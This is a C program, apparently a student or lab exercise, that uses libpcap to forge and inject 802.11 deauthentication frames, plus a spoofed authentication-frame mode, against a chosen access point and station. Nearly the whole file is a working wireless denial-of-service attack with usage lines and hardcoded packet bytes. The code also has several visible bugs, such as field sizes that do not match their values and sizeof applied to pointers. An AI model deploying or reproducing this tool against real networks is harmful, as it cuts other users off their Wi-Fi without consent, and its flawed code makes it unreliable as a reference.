#include<stdio.h>
#include<string.h>
#include <pcap.h>
#include <stdio.h>
#include <sys/types.h>
#include <time.h>
#include <arpa/inet.h> // for htons and htonl
// sudo ./deauth_attack mon0 F2:88:7B:8C:A0:26 48:bc:e1:8d:5a:2e -auth

// syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]
// sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB
int FLAG_AUTH = 0;
void examinOption();
#define PACKET_LEN 38
#define AUTH_PACKET_LEN 48
//   c0 00 3a 01 ff ff ff ff ff ff f2 88 7b 8c a0 26
//   f2 88 7b 8c a0 26 30 4b
void Auth_ATTACK(pcap_t* handle, uint8_t* apMac, uint8_t* BSSID, uint8_t* dstMac);


#define MAC_ADDR_LEN 6
#define RADIO_DEAUTH_LEN 12
#define RADIO_AUTH_LEN 18
struct DeauthPacket
{
    int8_t radioInformation[RADIO_DEAUTH_LEN];
    int8_t Management;
    int8_t Deauthentication;
    int16_t Duration;
    uint8_t dstMac[MAC_ADDR_LEN];
    uint8_t apMac[MAC_ADDR_LEN];
    uint8_t BSSID[MAC_ADDR_LEN];
    int8_t fragmentNumber;
    int8_t sequenceNumber;
    int8_t ReasonCode;
}__attribute__((packed)); // No apdding

struct AuthenticationPacket
{
    int8_t radioInformation[RADIO_AUTH_LEN];
    int8_t Management;
    int8_t Deauthentication;
    int16_t Duration;
    uint8_t dstMac[MAC_ADDR_LEN];
    uint8_t apMac[MAC_ADDR_LEN];
    uint8_t BSSID[MAC_ADDR_LEN];
    int8_t fragmentNumber;
    int8_t sequenceNumber;
    int8_t ReasonCode;
    int32_t FrameCheckSeq;
}__attribute__((packed)); // No apdding


void print_packet(const unsigned char *packet, int len) {
    for (int i = 0; i < len; i++) {
        printf("%02X ", packet[i]);
    }
    printf("\n");
}

void parse_mac_address(const char* str, uint8_t* mac) {
    sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

void main(int argc, char* argv[]){ 
    examinOption(argc, argv);
    struct DeauthPacket packet;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-auth") == 0) {
            FLAG_AUTH = 1;
        }
    }

    // when using this argument, make sure to use try and catch blcok;
    // The examinOption has not been implemented yet;
    char* interfaceName = argv[1];
    uint8_t apMac[MAC_ADDR_LEN]; 
    uint8_t BSSID[MAC_ADDR_LEN]; 
    parse_mac_address(argv[2], apMac);
    parse_mac_address(argv[2], BSSID);


    char* stationMac[MAC_ADDR_LEN];
    if(argc > 3){
        parse_mac_address(argv[3], stationMac);
    }
    uint8_t dstMac[MAC_ADDR_LEN] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
    if(argc > 3) 
        memcpy(dstMac, stationMac, MAC_ADDR_LEN);

    pcap_t* handle;
    char errbuf[26]; // stack over flow may be possible....(?) i don't known.
    handle = pcap_open_live(interfaceName , BUFSIZ, 1, 1000, errbuf);
    if(handle == NULL) {
        printf("Could not open device %s : %s \n", interfaceName , errbuf);
        exit(-1);
    }

    if(FLAG_AUTH == 1){
        Auth_ATTACK(handle, apMac, BSSID, dstMac);
        return 0;
    }

    uint8_t Radio[RADIO_DEAUTH_LEN] = { 0x00, 0x00, 0x0c, 0x00, 0x04, 0x80, 
        0x00, 0x00, 0x02, 0x00, 0x18, 0x00 };

    // = { 0xF2, 0x88, 0x7B, 0x8C, 0xA0, 0x26 }; // BSSID MAC
    //   00 00 0c 00 04 80 00 00 02 00 18 00 c0 00 3a 01
    //   ff ff ff ff ff ff f2 88 7b 8c a0 26 f2 88 7b 8c
    //   a0 26 50 01 07 00

    //sudo ./deauth_attack mon0 F2:88:7B:8C:A0:26 48:bc:e1:8d:5a:2e -auth
    memcpy( packet.radioInformation, Radio , sizeof(Radio));
    packet.Management = 0xC0;
    packet.Deauthentication = 0x00; 
    packet.Duration = htons( 0x3a01 );
    memcpy( packet.dstMac, dstMac , sizeof(dstMac));
    memcpy( packet.apMac, apMac , sizeof(apMac));
    memcpy( packet.BSSID, BSSID , sizeof(BSSID));
    packet.fragmentNumber = 0x00;
    packet.sequenceNumber = 0x00;
    packet.ReasonCode = htons( 0x0700 );

    const unsigned char packet_char[PACKET_LEN];
    memcpy(packet_char, &packet, sizeof(packet));
    for(int i = 0; i < 10; i++){
        if(pcap_sendpacket(handle, packet_char, sizeof(packet_char)) != 0){
            printf("Error Sending the paccking : %s \n", pcap_geterr(handle));
        }
        printf("Deauth packet send\n");
        // printf("==== debug ==== \n");
        sleep(1);
    }


    pcap_close(handle);
}


//   00 00 12 00 2e 48 00 00 10 02 6c 09 a0 00 d1 00
//   00 00 c0 00 3a 01 48 bc e1 8d 5a 2e f2 88 7b 8c
//   a0 26 f2 88 7b 8c a0 26 90 2a 01 00 7a 41 df 5a

void Auth_ATTACK(pcap_t* handle, uint8_t* apMac, uint8_t* BSSID, uint8_t* dstMac){
    struct AuthenticationPacket packet;
    uint8_t Radio[RADIO_AUTH_LEN] = { 
        0x00, 0x00, 0x12, 0x00, 0x2e, 0x48, 
        0x00, 0x00, 0x10, 0x02, 0x6c, 0x09,
        0xa0, 0x00, 0xd1, 0x00, 0x00, 0x00 
    };
    memcpy( packet.radioInformation, Radio , sizeof(Radio));
    packet.Management = 0xC0;
    

    packet.Deauthentication = 0x00; 
    packet.Duration = htons( 0x3a01 );
    memcpy( packet.dstMac, dstMac , sizeof(dstMac));
    memcpy( packet.apMac, apMac , sizeof(apMac));
    memcpy( packet.BSSID, BSSID , sizeof(BSSID));
    
    packet.fragmentNumber = 0x00;
    packet.sequenceNumber = 0x00;
    packet.ReasonCode = htons( 0x0100 );
    packet.FrameCheckSeq = htons( 0x7a41df5a );

    const unsigned char packet_char[AUTH_PACKET_LEN];
    memcpy(packet_char, &packet, sizeof(packet));
    for(int i = 0; i < 10; i++){
        if(pcap_sendpacket(handle, packet_char, sizeof(packet_char)) != 0){
            printf("Error Sending the paccking : %s \n", pcap_geterr(handle));
        }
        printf("Autication packet send\n");
        // printf("==== debug ==== \n");
        sleep(1);
    }


    pcap_close(handle);
}



void examinOption(int argc, char* argv){
    if(argc < 2){
        printf("invalid used; example : deauth-attack <interface> <ap mac> [<station mac> [-auth]] \n");
        exit(-1);
    }
    // Is argv[0] valid?

    // Is argv[1] valid?

}